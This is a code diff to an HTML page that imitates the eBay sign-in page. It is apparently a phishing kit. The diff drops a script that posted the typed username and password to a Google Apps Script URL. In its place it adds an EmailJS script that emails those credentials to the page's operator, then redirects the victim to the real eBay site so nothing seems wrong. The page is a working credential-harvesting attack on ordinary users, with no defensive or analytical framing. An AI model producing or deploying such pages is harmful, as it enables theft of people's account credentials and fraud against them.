@@ -113,11 +113,11 @@
 <body>
     <div class="header"><img src="https://i.ibb.co/3hpcxpT/Screenshot-4.png" alt="eBay"></div>
     <div class="login-container">
-        <h1>Sign in tooo your account</h1>
+        <h1>Sign in to your account</h1>
         <p>New to eBay? <a href="https://signup.ebay.com/pa/crte?siteid=0&co_partnerId=0&UsingSSL=1&rv4=1&ru=https%3A%2F%2Fwww.ebay.com%2Fmys%2Fhome%3Fsource%3DGBH&signInUrl=https%3A%2F%2Fsignin.ebay.com%2Fsignin%3Fsgn%3Dreg%26siteid%3D0%26co_partnerId%3D0%26UsingSSL%3D1%26rv4%3D1%26ru%3Dhttps%253A%252F%252Fwww.ebay.com%252Fmys%252Fhome%253Fsource%253DGBH&_trksid=p2487285.m5021.l46827">Create an account</a></p>
         <form id="loginForm" onsubmit="return validateForm()">
-            <input type="text" id="username" placeholder="Email or username" required>
-            <input type="password" id="password" placeholder="Password" required>
+            <input type="text" id="username" name="username"  placeholder="Email or username" required>
+            <input type="password" id="password"  name="password" placeholder="Password" required>
             <button type="submit" class="btn">Continue</button>
             <div class="error-message" id="error-message">
                 <img src="https://i.ibb.co/nLyy94N/Screenshot-5.png" alt="Error icon">Please enter both fields.
@@ -152,33 +152,30 @@
             } else {
                 errorMessage.style.display = "none";
 				
-             //   window.location.href = 'https://www.eBay.com/mys/home?source=GBH';
+             window.location.href = 'https://www.eBay.com/mys/home?source=GBH';
                 return false; // Prevent form submission and redirect
             }
         }
     </script>
 	
 	
-	     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();
+	   <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script type="text/javascript">
+  (function() {
+    emailjs.init("41oyeKpK_b3d3AZBJ"); // Reemplaza TU_USER_ID con tu ID de usuario
 
-            var username = document.getElementById('username').value;
-            var password = document.getElementById('password').value;
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+      event.preventDefault();
 
-            var formData = new FormData();
-            formData.append("username", username);
-            formData.append("password", password);
-
-            fetch("https://script.google.com/macros/s/AKfycbzbDDh7bCNaoBlzdxKfJ8LWLWMBYz6wHb2bWBQAOd68PzOX3E_fG1OloTXB5lunR1GG/exec", {
-                method: "POST",
-                body: formData
-            })
-			.then(response => response.json()) // Asegúrate de que el servidor devuelve una respuesta en formato JSON
-    .then(data => alert("ok"))
-    .catch(error => alert("Error al enviar los datos: " + error));
+      emailjs.sendForm('service_cd4gzxn', 'template_ulzd2hr', this)
+        .then(function(response) {
+          alert('Formulario enviado correctamente.');
+        }, function(error) {
+          alert('Error al enviar el formulario. Inténtalo de nuevo.');
         });
-    </script>
+    });
+  })();
+</script>
 	
 </body>
 </html>
